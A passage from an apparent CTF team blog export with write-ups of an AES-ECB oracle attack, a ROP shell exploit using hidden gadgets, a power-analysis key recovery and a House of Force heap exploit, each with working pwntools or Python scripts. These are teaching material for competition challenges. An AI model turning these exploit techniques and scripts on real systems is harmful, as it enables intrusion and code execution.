2a5831079c0a0591601f25278f4623f3 123456Plain Block1 Cipher Block1&#125;000000000000000 5f87ae73237e86dd625e820ba93056e0&#125;111111111111111 d9044a33bc1e523222289c56a6505c79&#125;222222222222222 774066300cda4278f32729b032a3bfe7 .... .......&#125;_______________ 2a5831079c0a0591601f25278f4623f3 Now that we have the padding character, we need to work something similar on how we got the 1st part of the flag, but now instead of comparing with the 1st block of the cipher we want to compare it with the 3rd block by sending an A we get the 3rd block cipher: 123456789PlaintextBlock1 Block2 Block3 Block4ATUCTF&#123;MY_B34UT1 FULL_FL4G_L0L_XD &#125;_______________ ________________CiphertextBlock1 Block2 Block3 7a80f91bcf406446befb10e0720b8a7d ece296fd74e495dc5b2890596777f3eb 2a5831079c0a0591601f25278f4623f3 Block4e845fa5520b78d20bdd0ff93339df9fe Now we test all characters until we match this block3: 123456Plain Block1 Cipher Block10_______________ 545506ce0fa14673dba3d92a09a287741_______________ a26f177d5ef506e40e79411f4a1ef0bf2_______________ a4a7aee9adba7af7d709662da5c19aee .... .......&#125;_______________ 2a5831079c0a0591601f25278f4623f3 With this we get the last character of the flag, now repeat this for the rest of the characters, I’ll give one more example how to get the next character, sending “AA” as input: 123456789PlaintextBlock1 Block2 Block3 Block4AATUCTF&#123;MY_B34UT 1FULL_FL4G_L0L_X D&#125;______________ ________________CiphertextBlock1 Block2 Block3 6ca95659b3828138ff0408db597a6614 45551fa5b4b751017e717e2e4193cc8d 3c872cee5f361ca44e66a554602ee1c3 Block4e845fa5520b78d20bdd0ff93339df9fe Now brute force it like this: 123456Plain Block1 Cipher Block10&#125;______________ 6ef0fae728efd2738f1a5f179f6980a81&#125;______________ 2c851b1a58399ffdc6b1c4ed23287fa72&#125;______________ 664fafa0563cc1b84931daf6cf1cbc68 .... .......D&#125;______________ 3c872cee5f361ca44e66a554602ee1c3 Repeat this and you’ll get every character of the flag, the python script I implemented for this:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253from pwn import *import reimport stringimport timer = remote('18.218.238.95', 12345)#r = process('./redacted.py')print r.recvuntil('Enter your text here: ')flag = ''if flag == '': r.sendline('A'*15) encrypted_first = re.findall(r'[a-f0-9]&#123;32,&#125;', r.recvuntil('Enter your text here: '))[0] for i in range(16): for c in string.printable: r.sendline('A'*(15-i) + flag+c) encrypted = re.findall(r'[a-f0-9]&#123;32,&#125;', r.recvuntil('Enter your text here: '))[0] if encrypted[:32] == encrypted_first[:32]: flag += c r.sendline('A'*(15-i-1)) encrypted_first = re.findall(r'[a-f0-9]&#123;32,&#125;', r.recvuntil('Enter your text here: '))[0] breakpadding_char = ''if padding_char == '': r.sendline('A'*1) encrypted_first = re.findall(r'[a-f0-9]&#123;32,&#125;', r.recvuntil('Enter your text here: '))[0] time.sleep(0.1) for x in string.printable: p = '&#125;'+ x*15 r.sendline(p) encrypted = re.findall(r'[a-f0-9]&#123;32,&#125;', r.recvuntil('Enter your text here: '))[0] if encrypted[:32] == encrypted_first[64:64+32]: padding_char = x breakr.sendline('&#125;'*1)encrypted_first = re.findall(r'[a-f0-9]&#123;32,&#125;', r.recvuntil('Enter your text here: '))[0]flag_part2 = ''for i in range(16,0,-1): for c in string.printable: p = c+flag_part2 + (i-1)*padding_char r.sendline(p) encrypted = re.findall(r'[a-f0-9]&#123;32,&#125;', r.recvuntil('Enter your text here: '))[0] if encrypted[:32] == encrypted_first[64:64+32]: flag_part2 = c + flag_part2 r.sendline('A'*(17-i+1)) encrypted_first = re.findall(r'[a-f0-9]&#123;32,&#125;', r.recvuntil('Enter your text here: '))[0] print flag+flag_part2 break Running it 12345678910111213141516171819python reeas.py [+] Starting local process './redacted.py': pid 11451Enter your text here: TUCTF&#123;A3S_3CB_1S&#125;TUCTF&#123;A3S_3CB_1S!&#125;TUCTF&#123;A3S_3CB_1S!!&#125;TUCTF&#123;A3S_3CB_1S!!!&#125;TUCTF&#123;A3S_3CB_1S!!!!&#125;TUCTF&#123;A3S_3CB_1S3!!!!&#125;TUCTF&#123;A3S_3CB_1SL3!!!!&#125;TUCTF&#123;A3S_3CB_1SBL3!!!!&#125;TUCTF&#123;A3S_3CB_1S4BL3!!!!&#125;TUCTF&#123;A3S_3CB_1SR4BL3!!!!&#125;TUCTF&#123;A3S_3CB_1S3R4BL3!!!!&#125;TUCTF&#123;A3S_3CB_1SN3R4BL3!!!!&#125;TUCTF&#123;A3S_3CB_1SLN3R4BL3!!!!&#125;TUCTF&#123;A3S_3CB_1SULN3R4BL3!!!!&#125;TUCTF&#123;A3S_3CB_1SVULN3R4BL3!!!!&#125;TUCTF&#123;A3S_3CB_1S_VULN3R4BL3!!!!&#125;","categories":[{"name":"Crypto","slug":"Crypto","permalink":"https://teamrocketist.github.io/categories/Crypto/"}],"tags":[{"name":"aes","slug":"aes","permalink":"https://teamrocketist.github.io/tags/aes/"},{"name":"ecb","slug":"ecb","permalink":"https://teamrocketist.github.io/tags/ecb/"},{"name":"tuctf2018","slug":"tuctf2018","permalink":"https://teamrocketist.github.io/tags/tuctf2018/"}]},{"title":"[Pwn] TUCTF 2018 - Shella Hard","slug":"Pwn-TUCTF-2018-Shella-Hard","date":"2018-11-26T01:07:48.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2018/11/26/Pwn-TUCTF-2018-Shella-Hard/","link":"","permalink":"https://teamrocketist.github.io/2018/11/26/Pwn-TUCTF-2018-Shella-Hard/","excerpt":"","text":"Shella Hard475Difficulty: mind-melting hardThis program is crap! Is there even anything here?nc 3.16.169.157 12345 We were given a 32 bit binary: 12$ file shella-hard shella-hard: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=4bf12a273afc940e93699d77a19496b781e88246, not stripped Checking it’s security we can see we have NX enabled:1234567$ checksec shella-hard[*] &apos;/ctf/work/ctf/tuctf2018/pwn/shella-hard/shella-hard&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) Now looking at the main function on radare2: We can easily see we have a buffer overflow here, the buf is located at ebp-0x10 and we are allowed to read up to 0x30 bytes with the read instruction, perhaps we have some limitations, we have a very limited space it only overflows 0x20 bytes from the buffer so we can’t create a very big rop chain, the binary is dynamic linked and the admins didn’t provide any libc file, even when not provided we can still use to find it , but we don’t have any way of leaking addresses, because the binary doesn’t use any function that spits the output to the stdout like printf, puts or even write. So since we can’t do anything of this the admins probably provided a way of creating a shell within the code, as we can see in radare we have a function named giveShell, which uses execve: After calculating the offsets to the return address we get something like this:1234567891011121314151617181920212223from pwn import *import randomimport timedef getConn(): return process('./shella-hard', aslr=False, env=&#123;&#125;) if local else remote('3.16.169.157', 12345)local = Truedebug = Truecontext.terminal = ['tmux', 'new-window']binary = ELF('./shella-hard')GIVESHELL = 0x0804845cr = getConn()if debug: gdb.attach(r, \"\"\"b mainb *0x08048457b *0x08048467b *0x08048449c\"\"\")r.send('A'* 20 + p32(GIVESHELL))r.interactive() But as we can see it looks broken? the address 0x6a006a44 will make us to crash into a page fault, as we can see here on gdb if we try to jump immediately into that function: After loosing some time and trying another things I remembered reading a paper about a cool ROP technique to find “hidden” rop gadgets, but what’s a hidden rop gadget? Let’s take an example: 128049166: 66 90 xchg %ax,%ax8049168: 80 3c 1f c3 cmpb $0xc3,(%edi,%ebx,1) For example this could be a sample snippet from objdump. The first column is the address of the instruction. The second column is the hexadecimal code (machine code) of the x86 instruction. The last column is the assembly instruction itself, in ASCII human readable format, with mnemonic and operands etc. You can notice the presence of the value 0xc3 as the last byte of the second instruction. This value is really important because it happens to be the machine code for the “ret” instruction. So the trick here is to jump into the middle of this instruction: 1cmpb $0xc3,(%edi,%ebx,1) For instance at address 0x8049166a. The CPU would see the following machine code sequence:1f c3 Which will be interpreted as: 12300000000 &lt;.data&gt;: 0: 1f pop %ds 1: c3 ret Finding a hidden rop gadget, we can use the same idea in the function givenShell: 1234567891011121314/ (fcn) sym.giveShell 26| sym.giveShell ();| 0x08048458 55 push ebp| 0x08048459 89e5 mov ebp, esp| 0x0804845b 90 nop| 0x0804845c a1446a006a mov eax, dword [0x6a006a44] ; [0x6a006a44:4]=-1| 0x08048461 006800 add byte [eax], ch| 0x08048464 850408 test dword [eax + ecx], eax ; [0x13:4]=-1 ; 19| 0x08048467 e8b4feffff call sym.imp.execve| 0x0804846c 83c40c add esp, 0xc| 0x0804846f 90 nop| 0x08048470 c9 leave\\ 0x08048471 c3 ret[0x08048340]&gt; What I did was to jump into the middle of:1| 0x0804845c a1446a006a mov eax, dword [0x6a006a44] ; [0x6a006a44:4]=-1 So lets see what happens what’s the “transformation” in radare if we jump into the middle: This is perfect! we get exactly what we need for spawning a shell! it even reveals there was a global with a “/bin/sh” string that I didn’t even found. Now fixing our python script: 1234567891011121314$ python shella-hard.py[*] '/ctf/work/ctf/tuctf2018/pwn/shella-hard/shella-hard' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000)[+] Starting local process './shella-hard': pid 1190[!] ASLR is disabled![*] Switching to interactive mode$ lscore flag output32 shella-hard shella-hard.py wtf.c$ cat flagflag&#123;test-flag-here&#125; No real flag here, unfortunately the admins shut down the challenges right after the challenges so I can only show it working locally and I don’t remember the real flag, anyway it doesn’t really matter.","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"},{"name":"x86","slug":"Pwn/x86","permalink":"https://teamrocketist.github.io/categories/Pwn/x86/"},{"name":"Stack Issue","slug":"Pwn/x86/Stack-Issue","permalink":"https://teamrocketist.github.io/categories/Pwn/x86/Stack-Issue/"},{"name":"Stack Overflow","slug":"Pwn/x86/Stack-Issue/Stack-Overflow","permalink":"https://teamrocketist.github.io/categories/Pwn/x86/Stack-Issue/Stack-Overflow/"}],"tags":[{"name":"tuctf2018","slug":"tuctf2018","permalink":"https://teamrocketist.github.io/tags/tuctf2018/"},{"name":"rop","slug":"rop","permalink":"https://teamrocketist.github.io/tags/rop/"},{"name":"pwn","slug":"pwn","permalink":"https://teamrocketist.github.io/tags/pwn/"},{"name":"jump_middle_instruction","slug":"jump-middle-instruction","permalink":"https://teamrocketist.github.io/tags/jump-middle-instruction/"}]},{"title":"[Crypto] SquareCtf 2018 - C4: leaky power","slug":"Crypto-SquareCtf-2018-C4-leaky-power","date":"2018-11-14T16:59:54.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2018/11/14/Crypto-SquareCtf-2018-C4-leaky-power/","link":"","permalink":"https://teamrocketist.github.io/2018/11/14/Crypto-SquareCtf-2018-C4-leaky-power/","excerpt":"","text":"C4: leaky power222C4 is a very advanced AES based defensive system. You are able to monitor the power lines. Is that enough?You’re given three files: powertraces.npy: Measurements (over time) of power consumption of a chip while performing AES encryption #: Corresponding plaintext inputs that were encrypted instructions.jwe: File encrypted using the same key as plaintexts.npy.note: The first two files are NumPy arrays.note: there’s a mistake in the way instructions.jwe was created (the algorithm is A128GCM, not A256GCM). The encryption used is AES, from reading the challenge description we know we eventually were able to monitor the powerlines having some power traces on powertraces.npy and the corresponding plaintexts used on plaintexts.npy, the ciphertext we want to decrypt is located at instructions.jwe. We have some power traces so we will need to use some kind of side-channel analysis: In CPA (Correlation power analysis) the goal is to accurately produce a power model of the device under attack. During an attack, the aim is to find Correlation between a predicted output and the actual power output of a device. If the power model is accurate then a strong correlation should be demonstrated between the predicted output and actual output. If this correlation is found then, gathering a large number of traces will enable one to show that the correctly predicted cipher key will demonstrate the highest level of correlation. One power model which may be used is the Hamming Weight Power Model. Traditionally, the Hamming weight of a value is the number of non-zeroes. For example, in the binary number 1100 0010 the Hamming weight would be 3. The assumption in using the Hamming Weight Power Model in power analysis attacks is that the number of bits set to 0 or 1 of an output is correlated with the power consumption of a device. The Hamming weight itself is then used as an arbitrary unit to model the consumption of power in a device. Hamming weight units can then be compared to the actual voltage levels of power traces captured when a device was performing cryptographic operations. This act of comparison is the process of finding correlation between the modelled power unit values and the actual power consumed. One technique to calculate correlation between the power model and the actual power consumption is to use Pearson correlation coefficient equation. In essence, this equation will take two sets data (X and Y) and calculate whether there is a linear (positive or negative) correlation between the two sets of values. We may use this equation to find significance in our power traces since the assumption with the Hamming Weight Power Model is that as the number of 1’s increase in our predicted output, so too does the power consumption increase in the actual output (and vice versa). Figure 1 - Pearson correlation coefficient equation AESAt the start of encryption, the plaintext values (the data to be encrypted) and the cipher key values (the key used for encryption and decryption purposes) will be each arranged into a 4×4 matrix in the positions as shown in Figure 2. Each value in this matrix holds 1 byte of data. During the AddRoundKey step, each plaintext value is XOR’d with a cipher key value at a matching position in the 4×4 matrix. Figure 2. Plaintext and cipher key arrangement. After AddRoundKey, the SubBytes step will use the result produced by Pi⊕ Ki as a lookup for a value stored in the Rijndael S-box. The S-box output will replace Pi⊕ Ki. The S-box is a 16×16 matrix of values which remains constant for all AES implementations. Each position in the 16×16 matrix will hold 1 byte of data.Figure 3 - Rijndael S-box For example if the result of Pi ⊕ Ki is c5 then we look for in the sbox table for the line c and the column 5 and we obtain the value a6. In the context of CPA attack implemented aim to exploit the fact that information may be leaked if one was to monitor the power consumption of a cryptographic device during the point in which the S-box lookup is carried out. Writing Python Script of CPABoth this files are numpy arrays, they can be loaded into python by using the numpy.load function: 123import numpy as nptraces = np.load('powertraces.npy')pt = np.load('plaintexts.npy') Now for each we want to create some hypothesis, the range is between 0x0 to 0xff (all possible bytes), this hypothesis are key guesses in which we will Xor them between with the plaintexts used and calculated it’s Hamming Weight : 1234567891011121314151617181920212223242526272829303132333435363738394041sbox=(0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16)def intermediate(pt, keyguess): return sbox[pt ^ keyguess]HW = [bin(n).count(\"1\") for n in range(0,256)]# Aes key is 16 bytes so for each best guessfor bnum in range(0, 16): cpaoutput = [0]*256 maxcpa = [0]*256 # for each keyguess for kguess in range(0, 256): print \"Subkey %2d, hyp = %02x: \"%(bnum, kguess), #Initialize arrays &amp; variables to zero sumnum = np.zeros(numpoint) sumden1 = np.zeros(numpoint) sumden2 = np.zeros(numpoint) hyp = np.zeros(numtraces) # calculate every hamming distance for all the traces for this key guess for tnum in range(0, numtraces): hyp[tnum] = HW[intermediate(pt[tnum][bnum], kguess)] Now still in the same loop we want to calculate the means of the hypothesis and the points of the trace, this comes from the correlation formula in Figure 2.We can say that the two aleatory variable X and Y where X is the hamming distance of the key hypothesis for every character of plaintext tested and Y for every points power consumption points in every trace. So concluding the Xi in the formula is the first HW[intermediate(plaintext[x0][k0], kguess)] and yi is all the points in the power consumption trace, while x̅ is the mean of variable X and ȳ is the respective mean of variable Y. Calculation the means: 12345#Mean of hypothesismeanh = np.mean(hyp, dtype=np.float64)#Mean of all points in tracemeant = np.mean(traces, axis=0, dtype=np.float64) Now calculating the summations in the formula and performing the square root: 1234567891011#For each trace, do the followingfor tnum in range(0, numtraces): hdiff = (hyp[tnum] - meanh) tdiff = traces[tnum,:] - meant sumnum = sumnum + (hdiff*tdiff) sumden1 = sumden1 + hdiff*hdiff sumden2 = sumden2 + tdiff*tdiffcpaoutput[kguess] = sumnum / np.sqrt( sumden1 * sumden2 )maxcpa[kguess] = max(abs(cpaoutput[kguess])) So after calculating the correlation for every key guess the best guess key is the one with highest value of correlation: 1bestguess[bnum] = np.argmax(maxcpa) In the end we get the complete key used in the encryption, the full script: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475import numpy as npHW = [bin(n).count(\"1\") for n in range(0,256)]sbox=(0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16)def intermediate(pt, keyguess): return sbox[pt ^ keyguess]traces = np.load('powertraces.npy')pt = np.load('plaintexts.npy')bestguess = []if bestguess == []: numtraces = np.shape(traces)[0]-1 numpoint = np.shape(traces)[1] bestguess = [0]*16 for bnum in range(0, 16): cpaoutput = [0]*256 maxcpa = [0]*256 for kguess in range(0, 256): #Initialize arrays &amp; variables to zero sumnum = np.zeros(numpoint) sumden1 = np.zeros(numpoint) sumden2 = np.zeros(numpoint) hyp = np.zeros(numtraces) for tnum in range(0, numtraces): hyp[tnum] = HW[intermediate(pt[tnum][bnum], kguess)] #Mean of hypothesis meanh = np.mean(hyp, dtype=np.float64) #Mean of all points in trace meant = np.mean(traces, axis=0, dtype=np.float64) #For each trace, do the following for tnum in range(0, numtraces): hdiff = (hyp[tnum] - meanh) tdiff = traces[tnum,:] - meant sumnum = sumnum + (hdiff*tdiff) sumden1 = sumden1 + hdiff*hdiff sumden2 = sumden2 + tdiff*tdiff cpaoutput[kguess] = sumnum / np.sqrt( sumden1 * sumden2 ) maxcpa[kguess] = max(abs(cpaoutput[kguess])) bestguess[bnum] = np.argmax(maxcpa) key = '' for b in bestguess: key += \"%02x\"%b print \"Best Key Guess: %s\" % key Running it : 12$ python leak_power.pyBest Key Guess: d2dea057d1145f456796966024a703b2 The key is d2dea057d1145f456796966024a703b2 now that we have the key we can decrypt the cyphertext, we can do this ith a few lines of go: 1234567891011121314151617181920212223242526272829303132package mainimport ( \"fmt\" \"io/ioutil\" \"os\" \"gopkg.in/square/go-jose.v2\" )// Read input from filefunc readInput(path string) []byte &#123; var bytes []byte var err error bytes, err = ioutil.ReadFile(path) exitOnError(err, \"unable to read input\") return bytes&#125;// Exit and print error message if we encountered a problemfunc exitOnError(err error, msg string) &#123; if err != nil &#123; fmt.Fprintf(os.Stderr, \"%s: %s\\n\", msg, err) os.Exit(1) &#125;&#125;func main() &#123; obj, err := jose.ParseEncrypted(string(readInput(\"instructions_corrected.jwe\"))) exitOnError(err, \"unable to parse message\") plaintext, err := obj.Decrypt(\"\\xd2\\xde\\xa0\\x57\\xd1\\x14\\x5f\\x45\\x67\\x96\\x96\\x60\\x24\\xa7\\x03\\xb2\") exitOnError(err, \"unable to decrypt message\") fmt.Print(string(plaintext))&#125; Running it we get the flag: 1234567891011121314151617181920212223242526272829$ go get gopkg.in/square/go-jose.v2$ go run aes_dec.goCONFIDENTIALTo disable C4, you will need:- 6 bits of Dragon Sumac- 1 nibble of Winter Spice- 1 byte of Drake Cardamom- 1 flag with value flag-e2f27bac480a7857de45- 2 diskfulls of Tundra Chives- 5 forksGrind the Dragon Sumac in a cup, making sure you don't break the cup as it's probably a delicate cup. Add a sprinkle ofliquid ice to turn it into a cream-like paste, then add the Winter Spice, first almost everything, then the last tinyremnants.Fill a pan with elemental water, add the mixture and cool it down with how cool you are, then bring the mixtureto a boil. Let it cool down to the body temperature of a reptile before adding the Drake Cardamom and Tundra Chives,all at once of one, then half at a time of the other.Bring everything back to a boil, turn of the heat, mix with the forks and let everything cool down. If youtouch the liquid and it burns you, it hasn't cooled down enough.Whisk the mixture heavily to aerate it. Stop when it's frothy.Drinking the potion will disable C4.note: A small, but very cold amount is needed for the potion to be effective. Mixing it in a milkshake could work, butbe wary of brain freeze. The flag was flag-e2f27bac480a7857de45 References https://www.tandfonline.com/doi/full/10.1080/23742917.2016.1231523 https://wiki.newae.com/Making_Scripts","categories":[{"name":"Crypto","slug":"Crypto","permalink":"https://teamrocketist.github.io/categories/Crypto/"}],"tags":[{"name":"aes","slug":"aes","permalink":"https://teamrocketist.github.io/tags/aes/"},{"name":"cpa","slug":"cpa","permalink":"https://teamrocketist.github.io/tags/cpa/"},{"name":"power_analysis","slug":"power-analysis","permalink":"https://teamrocketist.github.io/tags/power-analysis/"}]},{"title":"[Pwn] inCTF 2017 - Gryffindor","slug":"Pwn-inCTF-2017-Gryffindor","date":"2018-11-08T06:21:03.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2018/11/08/Pwn-inCTF-2017-Gryffindor/","link":"","permalink":"https://teamrocketist.github.io/2018/11/08/Pwn-inCTF-2017-Gryffindor/","excerpt":"","text":"gryffindorlibc.so.6 I’ve been looking at attacks on the heap lately, since I didn’t do any kind of write-up about this I ended up looking for an old ctf challenge from inCTF 2017, I did solved this challenge some days after the ctf (not during it) but back in the day I didn’t have the time to do a write about this. The binary in this challenge was an ELF 64-bit, first thing we are likely to look up is for it’s security:1234567$ checksec gryffindor[*] '/ctf/work/ctf/inctf2017/pwn/gryffindor/gryffindor' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) Now after this we want to run the binary itself so we can see what it does, the application present us with a menu which gives us 4 options: We can create a new item where we can specify the input allocation size and the index. We can delete an item by stipulating it’s index. We can edit an item by indicating it’s index then we can modify it’s content by giving it a size and the string itself. Finally we have an option to exit the binary By checking the add for option 1 we can already see some interesting things : Now checking the delete option 2, doesn’t look we have any kind of vulnerabilities: Finally on option 3 edit we can find a heap overflow vulnerability: House of Force the Jedi OverflowThis attack focuses on making malloc return an arbitrary pointer, we can achieve this by exploiting the top_chunk… The top most chunk also known as the ‘wilderness’. This assumes an overflow into the top chunk’s header (we have an overflow as we saw in option 3), if we can overflow and modify the top_chunk size into a very large value, all the initial requests will be services using the top chunk, instead of relying on mmap. If we set it into -1 this will be evaluated into 0xFFFFFFFFFFFFFFFF in a 64 bit binary. Assuming we as the attackers want to make make malloc to return an address p, after we set the size into -1 any malloc call with the size of P- &amp;top_chunk will return P as a pointer to that address. If we force malloc to return a pointer of our choice we will gain an arbitrary write to that address. The Ingredients to perform this attack can be looked as follows: The exploiter must be able to overwrite the top chunk (i.e. the overflow must happen in a chunk that allows to overwrite the wilderness). There is a malloc() call with an exploiter-controllable size. There is another malloc() call where data are controlled by the exploiter. A leaked heap address so we can calculate the size required to force malloc return the address we want. As we can look above we have almost everything, the only thing’s missing is the last point we don’t have any heap address leaked and after our analysis there isn’t any kind of vulnerability to leak any kind of addresses… Well we missed this function:As we can see above the author of the challenge was nice enough to give us the a leak for free. Replace atoi with printf for format string vulnerabilityNow that we have all the ingredients we can put house of force into practice, first lets write some functions add and edit options, and extract the heap address: 1234567891011121314151617181920212223242526272829303132from pwn import *import sysdef add_g(size, index): r.recv() r.sendline('1') r.recv() r.sendline(size) r.recv() r.sendline(index)def edit_g(size, index, inp, choice='3'): r.recv() r.sendline(choice) r.recv() r.sendline(index) r.recv() r.sendline(size) r.sendline(inp)context.terminal = ['tmux', 'new-window']binary = ELF('./gryffindor')libc = ELF('libc.so.6')r = process('./gryffindor', env=&#123;'LD_LIBRARY_PATH': os.path.join(os.getcwd(),\"./libc.so.6\")+\" \"+sys.path[0]&#125;)#gdb.attach(r, \"\"\"# b *0x400bd9# \"\"\")r.recv()r.sendline('1337')heap = int(r.recv(9),16)+0x1b0log.info('[X] LEAKED HEAP 0x%x' % (heap))add_g('130', '0') The 0x1b0 offset which is offset to top_chunk can be calculated as follows: Overflowing wilderness size1234################################################################################ HOUSE OF FORCEadd_g('130', '0')edit_g(str(18*8), '0','A'*17*8 + p64(-1,signed=True)) Looking at the heap after we overflow it: Now we can force malloc to return the pointer P we need by just passing the calculation P - &amp;top_chunk as the size, after this the next malloc will return the pointer we want: 12345678910################################################################################ HOUSE OF FORCE - Replace atoi with printf to gain format string vulnerabilityadd_g('130', '0')edit_g(str(18*8), '0','A'*17*8 + p64(-1,signed=True))add_g(str(binary.got['atoll']-top_chunk), '1')add_g('130', '2') # this malloc will return got address of atolledit_g('130', '2', p64(binary.plt['atoll']+6) + p64(binary.plt['malloc']+6) + p64(binary.plt['setvbuf']+6) + p64(binary.plt['printf']+6)) The look on gdb after executing malloc: atoll and atoi are different functions they almost do the same thing yet they are being used in different places in the binary, the one we want is actually atoi, you must be asking why didn’t I used house of force on the atoi address, well when I was using the atoi address with house of force for some reason I was getting an segmentation fault, can’t really explain why because I didn’t understand it, well if you know why this happens feel free to write in the comments I would really appreciate that. To circumvent this I used the atoll GOT, we can still overwrite atoi but we will need to override other got addresses because malloc, setvbuf are between them as you can see bellow: So to not break the binary we should not override them with junk so thats why i’m setting it to their plts in this line of code: 1234edit_g('130', '2', p64(binary.plt['atoll']+6) + p64(binary.plt['malloc']+6) + p64(binary.plt['setvbuf']+6) + p64(binary.plt['printf']+6)) Now that we override the atoi GOT with the printf PLT we can use format_string to leak addresses from the stack: 1234567891011121314151617181920212223##################################################### LEAK LIBCr.recv()time.sleep(0.1)r.sendline('%p %p %p')s = r.recv()list_addr = s.split(' ')STACK_ADDRESS = int(list_addr[0],16)+168-32-32leaked = int(list_addr[2][:-8].rstrip(),16)LIBC_BASE = leaked-0xf7260SYSTEM = LIBC_BASE + libc.symbols['system']ONE_GADGET = LIBC_BASE + 0x4526aONE_GADGET_LOW = ONE_GADGET &amp; 0xffffffffONE_GADGET_HIGH = (ONE_GADGET &amp; 0xffffffff00000000) &gt;&gt; 32log.info('[X] LEAKED 0x%x' % (leaked))log.info('[X] LEAKED LIBC_BASE 0x%x' % LIBC_BASE)log.info('[X] LEAKED STACK_ADDRESS 0x%x' % STACK_ADDRESS)log.info('[X] LEAKED SYSTEM 0x%x' % SYSTEM)log.info('[X] LEAKED LOW_ONE_GADGET 0x%x' % ONE_GADGET_LOW)log.info('[X] LEAKED HIGH_ONE_GADGET 0x%x' % ONE_GADGET_HIGH)#################################################### After printf is executed, if we leak the first 3 addresses from the stack we can see the 1st one is an address from the stack and the 3rd is an address from libc, we can calculate the offset to the by using gdb Spawning a shellI ended up 